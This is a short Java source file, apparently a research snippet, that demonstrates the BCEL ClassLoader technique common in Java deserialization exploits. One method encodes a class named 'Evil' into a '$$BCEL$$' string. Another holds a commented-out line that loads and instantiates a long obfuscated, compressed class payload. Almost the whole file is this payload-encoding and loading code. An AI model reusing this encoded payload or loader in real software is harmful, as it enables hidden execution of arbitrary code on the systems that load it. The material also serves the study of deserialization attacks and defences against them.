package classload;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.io.IOException;

public class bcelload {
    public static void main(String []args) throws Exception {
        bceldecode();
    }

    public static void bcelencode() throws IOException {
        JavaClass cls = Repository.lookupClass(Evil.class);
        String code = Utility.encode(cls.getBytes(), true);
        System.out.println(code);

    }
    public static void bceldecode() throws Exception{
        //new ClassLoader().loadClass("$$BCEL$$" +"$l$8b$I$A$A$A$A$A$A$A$a5T$5bo$SA$U$fe$G$90$F$8a$b5P$f1$7ei$bd$V$f02$_$fa$600Z$b45$92Pk$84$d4$H$9f$86e$841$7bif$87$86$f8$83$7c$f7E$8d$P$fe$A$7f$94$f1$cc$b2m1$92$94$da$ddl$ce$9c$cb$f7$9d3$t_$f6$d7$ef$l$3f$B$3c$c4$bd$C$b2$b8V$c0u$ac$e4$b0j$ed$N$H7$j$dcb$c8$3eQ$812O$Z$d2$d5$da$OC$e6E$d8$97$Mg$da$w$90$afG$7eO$ea$ae$e8y$U$v$b7CWx$3bB$x$eb$t$c1$8c$Z$aa$88a$a9$edz$o$8a$bcP$f4$f9$e6$9e$f2$g$M$85$cd$b1$xw$8d$K$83$c8$c1m$86$bc$d1$o$88$3e$84$dag$d0$d5$b6$h$fa$3c$g$F$3c$d4$D$$v$85$3b$94$7c$y$3c$Rp$V$Y$a9$D$e1$f1q$e4$Z$97olo5$de$cf$ac$f6$bd$c3$daH$d2T$9e$fa$q5$ef$qGa$5b$bf$SA$df$93$baa$_$96$eb$87$ee$c8$97$81a$b8$7f$ac$f6$E$jNx$e8$a6$cfO$3e$8c$83$3b$M$9f$8f$b7$82$p$9b$f6$8d$cf7$ba$5b$cd$b1$8aZ$U$S$s$d4G$83$e6Z$9bJ$e8$Y$k$fd$d7$U$MN$b2$3e$86$e6$89G$oau$c2$91v$e5Ke$f5$97$b7j$7b$f0Q$ec$89$o$i$e4$i$ac$VQE$8d$84IZu$8b$a8$e3$$$c3$e2$df$e2dX$9fw$f5z$U$Y$e5K$de$ecE$q_$d7t$ad$86$3dI$SZ$b6$3d$b9$Kyk$fb$40$e8$M$8f$e7$r$de$t$9a$c2$96bF$aa$j$f0$b7$93$b6t$d7$814$HN$a5Zk$ffSC$L$c9$c8$b1t$Z$d6$aaS$d9$8e$d1$w$Y4$a6$Bot$e8$ca$uj$60$V$a7$e8g$60$9f4$98$dd$gR$c8$93$b7N$96$91$5d$ac$7f$D$fb$8eT9$fd$V$99w_$u$92B$c1$c6$a9$kX$40$GE$9c$a6w$81$bc$e2$E$RG$ac$Fe$e9$e7A$df$SJ$J$ef$b3$b8$T$c0$O$a9$b21$ac$US$acL$92$J$85$3d$95$b1$i$e7$Z$ce$a2B$88$7d$das1$ed$f9$84$b6$VGg$d0Vb$da$fa$q9$93$f6$C$$$S$c2$9e$$$e12$b5$9fnp$rf$bb$fa$H$c4$93$9dy$3a$F$A$A").newInstance();
    }
}
